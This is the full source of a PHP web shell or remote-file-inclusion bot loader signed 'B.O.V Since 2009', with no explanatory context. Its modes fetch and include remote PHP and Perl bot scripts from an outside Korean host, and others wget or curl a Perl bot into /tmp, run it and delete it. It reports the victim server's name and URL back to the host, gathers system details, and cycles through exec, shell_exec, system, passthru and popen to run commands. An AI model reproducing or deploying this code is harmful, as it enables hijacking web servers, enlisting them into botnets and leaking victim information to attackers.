<!--[B.O.V]-->

<html>

<style> body { font:10pt tahoma;color:#808080;background:black;margin:4; } a    { color:#3366FF;text-decoration:none; } </style>

<body>

<?php

echo(base64_decode('JVJGSSU='));

echo('<BR>');

@ini_restore('safe_mode');@ini_set('default_socket_timeout', 2);@error_reporting(0);@set_time_limit(0);@ignore_user_abort();

$modez = $_GET["mode"];



$url = "http://fastcall.co.kr/xe/files/faceOff/141/";



switch ($modez) {

case "phpbot": include($url.'pbot.txt');

break;

case "sqlbot": include($url.'psql.txt');

break;

case "safe":

@file($url.'safe.php?rfi='.base64_encode($_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI']));

break;

case "bovbot": 

    echo fx29exec('cd /tmp;wget '.$url.'pbot.txt');

    echo fx29exec('cd /tmp;curl -O '.$url.'pbot.txt');

    echo fx29exec('cd /tmp;/usr/bin/perl pbot.txt');

    echo fx29exec('cd /tmp;rm -rf pbot.txt*');

break;

case "perlbot": 

    echo fx29exec('cd /tmp;wget '.$url.'pbot.txt');

    echo fx29exec('cd /tmp;curl -O '.$url.'pbot.txt');

    echo fx29exec('cd /tmp;/usr/bin/perl pbot.txt');

    echo fx29exec('cd /tmp;rm -rf pbot.txt');

break;

/*

case "bindport": 

    echo fx29exec('cd /tmp;wget '.$url.'bd.v');

    echo fx29exec('cd /tmp;curl -O '.$url.'bd.v');

    echo fx29exec('cd /tmp;/usr/bin/perl bdv');

    echo fx29exec('cd /tmp;rm -rf bd.v');

break;

*/

case "id": 

$P   = @getcwd();

$IP  = @getenv("SERVER_ADDR");

$UID = fx29exec("id");

fx("SAFE",@safemode()?"ON":"OFF");

fx("OS",@PHP_OS);

fx("UNAME",@php_uname());

fx("SERVER",($IP)?$IP:"-");

fx("USER",@get_current_user());

fx("UID",($UID)?$UID:"uid=".@getmyuid()." gid=".@getmygid());

fx("DIR",$P);

fx("PERM",(@is_writable($P))?"[W]":"[R]");

fx("HDD","Used: ".hdd("used")." Free: ".hdd("free")." Total: ".hdd("total"));

fx("DISFUNC",@getdisfunc());



break;

}



function fx($t,$c) { echo "$t: "; echo (is_array($c))?join(" ",$c):$c; echo "<br>"; }

function safemode() { return (@ini_get("safe_mode") OR eregi("on",@ini_get("safe_mode")) ) ? TRUE : FALSE; }

function getdisfunc() { $rez = explode(",",@ini_get("disable_functions")); return (!empty($rez))?$rez:array(); }

function enabled($func) { return (function_exists($func) && is_callable($func) && !in_array($func,getdisfunc())) ? TRUE : FALSE; }

function fx29exec($cmd) {

  if (enabled("exec")) { exec($cmd,$o); $rez = join("\r\n",$o); }

  elseif (enabled("shell_exec")) { $rez = shell_exec($cmd); }

  elseif (enabled("system")) { @ob_start(); @system($cmd); $rez = @ob_get_contents(); @ob_end_clean(); }  

  elseif (enabled("passthru")) { @ob_start(); passthru($cmd); $rez = @ob_get_contents(); @ob_end_clean(); }

  elseif (enabled("popen") && is_resource($h = popen($cmd.' 2>&1', 'r')) ) { while ( !feof($h) ) { $rez .= fread($h, 2096);  } pclose($h); }

  else { $rez = "Error!"; }

  return $rez;

}

function vsize($size) {

  if (!is_numeric($size)) { return FALSE; }

  else {

    if ( $size >= 1073741824 ) { $size = round($size/1073741824*100)/100 ." GB"; }

    elseif ( $size >= 1048576 ) { $size = round($size/1048576*100)/100 ." MB"; }

    elseif ( $size >= 1024 ) { $size = round($size/1024*100)/100 ." KB"; }

    else { $size = $size . " B"; }

    return $size;

  }

}

function hdd($type) {

  $P = @getcwd(); $T = @disk_total_space($P); $F = @disk_free_space($P); $U = $T - $U;

  $hddspace = array("total" => vsize($T), "free"  => vsize($F), "used"  => vsize($U));

  return $hddspace[$type];

}



@die(base64_decode('Qi5PLlYgU2llbmNlIDIwMDk='));	



?>

</body></html>